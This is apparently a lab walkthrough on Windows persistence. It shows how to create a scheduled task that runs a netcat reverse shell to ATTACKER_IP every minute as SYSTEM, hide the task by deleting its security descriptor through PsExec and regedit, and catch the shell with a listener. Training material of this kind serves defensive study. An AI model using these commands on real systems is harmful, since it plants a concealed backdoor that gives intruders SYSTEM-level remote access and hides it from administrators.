# Abusing scheduled tasks

The most common way to schedule tasks is using the built-in 
[Windows task scheduler](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks). 
The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that 
will activate at specific hours, repeat periodically or even trigger when specific system events occur.

Create a task that runs a reverse shell every minute. In a real-world scenario, you will not want your payload to 
run that often, but we don't want to wait too long for this exercise:

    schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
    SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.

The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates 
that the task will run with `SYSTEM` privileges. Check with:

    schtasks /query /tn thm-taskbackdoor

To hide the scheduled task, make it invisible to any user in the system by deleting its Security Descriptor (SD). 
The security descriptor is an ACL that states which users have access to the scheduled task. If a user is not 
allowed to query a scheduled task, it will not be visible, as Windows only shows the tasks that a user has permission 
to use. Deleting the `SD` is equivalent to disallowing all users' access to the scheduled task, including 
Administrators.

The security descriptors of all scheduled tasks are stored in 
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. There is a registry key for every task, 
under which a value named `SD` contains the security descriptor. You can only erase the value if you have SYSTEM 
privileges.

Use `psexec` (available in `C:\tools`) to open `Regedit` with `SYSTEM` privileges:

    c:\tools\pstools\PsExec64.exe -s -i regedit

And delete the security descriptor for the task.

Checking, the system reports there is no such task:

    schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.

Start a listener on the attack machine:

     nc -nlvp 4449

And a reverse shell.

